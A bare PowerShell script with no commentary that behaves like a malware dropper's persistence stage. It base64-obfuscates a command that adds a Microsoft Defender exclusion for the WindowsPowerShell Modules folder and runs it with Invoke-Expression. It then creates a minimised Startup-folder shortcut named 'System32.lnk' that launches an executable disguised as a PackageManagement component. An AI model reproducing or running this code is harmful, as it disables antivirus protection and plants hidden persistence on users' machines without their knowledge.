$encoded = "QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAiQzpcUHJvZ3JhbSBGaWxlc1xXaW5kb3dzUG93ZXJTaGVsbFxNb2R1bGVzXCI="

$decodedBytes = [System.Convert]::FromBase64String($encoded)
$decodedCommand = [System.Text.Encoding]::UTF8.GetString($decodedBytes)

$mpPrefs = Get-MpPreference
$path = "C:\Program Files\WindowsPowerShell\Modules\"
if ($mpPrefs.ExclusionPath -contains $path) {
    $targetPath = "C:\Program Files\WindowsPowerShell\Modules\PackageManagement\1.0.0.1\DSCResources\PackageCoreSystem.exe"

    $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\System32.lnk"

    $wshShell = New-Object -ComObject WScript.Shell

    $shortcut = $wshShell.CreateShortcut($shortcutPath)

    $shortcut.TargetPath = $targetPath
    $shortcut.WindowStyle = 7
    $shortcut.Save()
} else {
    Invoke-Expression $decodedCommand
    $targetPath = "C:\Program Files\WindowsPowerShell\Modules\PackageManagement\1.0.0.1\DSCResources\PackageCoreSystem.exe"

    $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\System32.lnk"

    $wshShell = New-Object -ComObject WScript.Shell

    $shortcut = $wshShell.CreateShortcut($shortcutPath)

    $shortcut.TargetPath = $targetPath
    $shortcut.WindowStyle = 7
    $shortcut.Save()
}
